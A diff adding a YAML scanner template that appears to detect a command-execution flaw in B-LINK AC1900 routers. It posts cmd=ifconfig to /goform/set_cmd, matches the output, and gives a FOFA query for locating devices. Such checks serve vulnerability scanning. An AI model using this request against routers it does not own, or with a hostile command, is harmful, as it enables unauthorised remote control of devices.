@@ -1,0 +1,18 @@
+id: poc-yaml-b-link-ac1900-set-cmd-rce
+info:
+  name: B-LINK AC1900 set_cmd 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: ac1900
+  fofa: title=="B-LINK"
+requests:
+- method: POST
+  path: /goform/set_cmd
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: cmd=ifconfig
+  expression: status_code == 200 && contains(body,"\"type\":\"setcmd\"") && contains(body,"cmdinfo")
+    && contains(body,"Link encap") && contains(body,"HWaddr") && !contains(body,"<")
+variables: {}
+transport: http
